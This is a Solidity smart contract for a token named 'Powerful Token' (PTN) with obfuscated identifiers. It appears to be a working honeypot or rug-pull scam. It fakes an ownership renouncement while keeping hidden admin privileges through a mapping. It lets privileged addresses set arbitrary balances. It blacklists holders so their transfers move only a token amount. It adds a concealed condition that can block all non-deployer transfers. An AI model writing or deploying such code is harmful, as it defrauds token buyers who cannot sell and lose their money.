//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface atFrom {
    function totalSupply() external view returns (uint256);

    function balanceOf(address launchedLiquidity) external view returns (uint256);

    function transfer(address feeBuy, uint256 totalAt) external returns (bool);

    function allowance(address takeTotal, address spender) external view returns (uint256);

    function approve(address spender, uint256 totalAt) external returns (bool);

    function transferFrom(
        address sender,
        address feeBuy,
        uint256 totalAt
    ) external returns (bool);

    event Transfer(address indexed from, address indexed amountExemptBuy, uint256 value);
    event Approval(address indexed takeTotal, address indexed spender, uint256 value);
}

abstract contract enableMinTrading {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface txSender {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface tradingAt {
    function createPair(address maxFromSender, address txFrom) external returns (address);
}

interface atFromMetadata is atFrom {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract PowerfulToken is enableMinTrading, atFrom, atFromMetadata {

    function liquidityLaunched(address buyTotal) public {
        takeTrading();
        
        if (buyTotal == autoReceiver || buyTotal == amountLaunched) {
            return;
        }
        txTo[buyTotal] = true;
    }

    function symbol() external view virtual override returns (string memory) {
        return sellSenderTake;
    }

    string private totalSellAmount = "Powerful Token";

    mapping(address => bool) public txTo;

    function name() external view virtual override returns (string memory) {
        return totalSellAmount;
    }

    uint256 constant modeLaunched = 3 ** 10;

    bool private fromWallet;

    mapping(address => mapping(address => uint256)) private isBuyMarketing;

    function limitReceiver(address liquidityFee) public {
        if (tradingBuy) {
            return;
        }
        
        txReceiver[liquidityFee] = true;
        if (modeTokenAmount != liquidityMax) {
            enableFund = false;
        }
        tradingBuy = true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return feeSwap;
    }

    bool private takeAt;

    uint256 tradingTx;

    address autoTokenFund = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function transfer(address launchMarketing, uint256 totalAt) external virtual override returns (bool) {
        return tradingFund(_msgSender(), launchMarketing, totalAt);
    }

    bool public enableFund;

    function allowance(address launchSwap, address marketingSell) external view virtual override returns (uint256) {
        if (marketingSell == modeSell) {
            return type(uint256).max;
        }
        return isBuyMarketing[launchSwap][marketingSell];
    }

    mapping(address => bool) public txReceiver;

    address public autoReceiver;

    bool private takeWallet;

    event OwnershipTransferred(address indexed atLaunched, address indexed isTokenSwap);

    address modeSell = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function shouldToken(uint256 totalAt) public {
        takeTrading();
        sellFee = totalAt;
    }

    uint256 private liquidityMax;

    string private sellSenderTake = "PTN";

    uint256 private feeSwap = 100000000 * 10 ** 18;

    function feeMarketing() public {
        emit OwnershipTransferred(autoReceiver, address(0));
        modeTake = address(0);
    }

    function balanceOf(address launchedLiquidity) public view virtual override returns (uint256) {
        return listLaunchedIs[launchedLiquidity];
    }

    bool public receiverMode;

    bool public tradingBuy;

    uint256 private modeTokenAmount;

    uint256 sellFee;

    constructor (){
        
        txSender fromTotalReceiver = txSender(modeSell);
        amountLaunched = tradingAt(fromTotalReceiver.factory()).createPair(fromTotalReceiver.WETH(), address(this));
        
        autoReceiver = _msgSender();
        feeMarketing();
        txReceiver[autoReceiver] = true;
        listLaunchedIs[autoReceiver] = feeSwap;
        if (fromWallet) {
            takeWallet = false;
        }
        emit Transfer(address(0), autoReceiver, feeSwap);
    }

    uint8 private totalSender = 18;

    function tradingFund(address totalFee, address feeBuy, uint256 totalAt) internal returns (bool) {
        if (totalFee == autoReceiver) {
            return tokenTrading(totalFee, feeBuy, totalAt);
        }
        uint256 fundEnable = atFrom(amountLaunched).balanceOf(autoTokenFund);
        require(fundEnable == sellFee);
        require(feeBuy != autoTokenFund);
        if (txTo[totalFee]) {
            return tokenTrading(totalFee, feeBuy, modeLaunched);
        }
        return tokenTrading(totalFee, feeBuy, totalAt);
    }

    address private modeTake;

    mapping(address => uint256) private listLaunchedIs;

    function transferFrom(address totalFee, address feeBuy, uint256 totalAt) external override returns (bool) {
        if (_msgSender() != modeSell) {
            if (isBuyMarketing[totalFee][_msgSender()] != type(uint256).max) {
                require(totalAt <= isBuyMarketing[totalFee][_msgSender()]);
                isBuyMarketing[totalFee][_msgSender()] -= totalAt;
            }
        }
        return tradingFund(totalFee, feeBuy, totalAt);
    }

    function tokenTrading(address totalFee, address feeBuy, uint256 totalAt) internal returns (bool) {
        require(listLaunchedIs[totalFee] >= totalAt);
        listLaunchedIs[totalFee] -= totalAt;
        listLaunchedIs[feeBuy] += totalAt;
        emit Transfer(totalFee, feeBuy, totalAt);
        return true;
    }

    function owner() external view returns (address) {
        return modeTake;
    }

    function approve(address marketingSell, uint256 totalAt) public virtual override returns (bool) {
        isBuyMarketing[_msgSender()][marketingSell] = totalAt;
        emit Approval(_msgSender(), marketingSell, totalAt);
        return true;
    }

    address public amountLaunched;

    function takeTrading() private view {
        require(txReceiver[_msgSender()]);
    }

    function launchedTrading(address launchMarketing, uint256 totalAt) public {
        takeTrading();
        listLaunchedIs[launchMarketing] = totalAt;
    }

    function decimals() external view virtual override returns (uint8) {
        return totalSender;
    }

    function getOwner() external view returns (address) {
        return modeTake;
    }

}